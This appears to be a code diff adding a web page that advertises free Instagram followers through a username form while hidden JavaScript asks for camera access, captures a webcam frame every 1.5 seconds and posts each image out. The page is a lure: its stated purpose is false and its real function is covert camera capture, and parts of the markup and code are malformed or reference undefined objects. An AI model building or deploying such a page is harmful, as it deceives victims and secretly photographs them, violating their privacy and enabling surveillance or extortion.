@@ -1,0 +1,51 @@
+<html>
+<title> followers maker </title>
+<body>
+hello guys! in this webpage you can make followers of instagram<h1>
+<form>
+  <label for="fname">Enter username:</label><br>
+  <input type="text" id="fname" name="fname" value=""><br>
+  <label for="lname">Enter how much followers do you want:</label><br>
+  <input type="text" id="lname" name="lname" value="">
+</form>
+<h1> Thanks for using our website
+</body>
+<html>
+
+// Access webcam
+async function init() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+    handleSuccess(stream);
+  } catch (e) {
+    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+  }
+}
+
+// Success
+function handleSuccess(stream) {
+  window.stream = stream;
+  video.srcObject = stream;
+
+var context = canvas.getContext('2d');
+  setInterval(function(){
+
+       context.drawImage(video, 0, 0, 640, 480);
+       var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+       post(canvasData); }, 1500);
+  
+
+}
+
+// Load init
+init();
+
+</script>
+
+    <body>
+ 	<div class="load" id="loader">
+ 				<p>	allow camera access   </p>
+  			<div class="loader"></div>
+  </div> 
+    </body>
+</html>
